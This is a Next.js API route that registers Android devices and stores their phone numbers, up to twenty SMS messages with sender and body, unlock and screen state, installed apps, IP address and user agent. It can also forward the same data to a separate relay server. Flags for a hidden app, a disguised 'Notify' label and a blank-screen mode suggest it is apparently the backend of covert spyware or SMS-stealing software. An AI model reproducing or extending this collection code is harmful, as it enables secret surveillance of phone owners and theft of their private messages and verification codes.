import { NextRequest, NextResponse } from "next/server";
import { upsertDevice, getRelayerUrl } from "@/lib/store";

export async function POST(req: NextRequest){
  try{
    const body = await req.json();
    const relayer = getRelayerUrl();
    if (relayer) {
      try {
        const r = await fetch(`${relayer.replace(/\/$/,"")}/relay/register`, { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ ...body, ip: req.headers.get("x-forwarded-for")||undefined, userAgent: req.headers.get("user-agent")||undefined }) });
        if (r.ok) return NextResponse.json(await r.json());
      } catch(e){ console.warn("relayer register forward failed", e); }
    }
    const { deviceId, model="unknown", androidVersion="?", appVersion="0.2.1-poss", installed=[], missing=[], monitorRunning=false, batteryOptimized=false, inUse, screenOn, lastUnlock, ringerMode="normal", appState="closed", appStateAt="", alias="notify", appLabel="Notify", hidden=false, blankEnabled=false, relayActive=false, relaySlot=1, phoneNumbers, sms } = body || {};
    if(!deviceId) return NextResponse.json({error:"deviceId required"}, {status:400});
    const dev = await upsertDevice({ deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, ...(typeof inUse === "boolean" ? { inUse } : {}), ...(typeof screenOn === "boolean" ? { screenOn } : {}), ...(typeof lastUnlock === "string" ? { lastUnlock } : {}), ringerMode: ["normal", "vibrate", "silent"].includes(ringerMode) ? ringerMode : "normal", appState: ["opened", "partial", "closed"].includes(appState) ? appState : "closed", appStateAt: typeof appStateAt === "string" ? appStateAt : "", alias, appLabel, hidden: !!hidden, blankEnabled: !!blankEnabled, relayActive: !!relayActive, relaySlot: relaySlot === 2 ? 2 : 1, ...(Array.isArray(phoneNumbers) ? { phoneNumbers: phoneNumbers.filter((x: unknown) => typeof x === "string").map((x: string) => x.slice(0, 32)) } : {}), ...(Array.isArray(sms) ? { sms: sms.slice(0, 20).map((m: any) => ({ from: typeof m?.from === "string" ? m.from.slice(0, 32) : "", body: typeof m?.body === "string" ? m.body.slice(0, 512) : "", date: Number(m?.date) || 0 })) } : {}), ip: req.headers.get("x-forwarded-for")||undefined, userAgent: req.headers.get("user-agent")||undefined });
    return NextResponse.json({ ok:true, device: dev });
  }catch(e:any){ return NextResponse.json({error:e.message||"bad json"},{status:400}) }
}
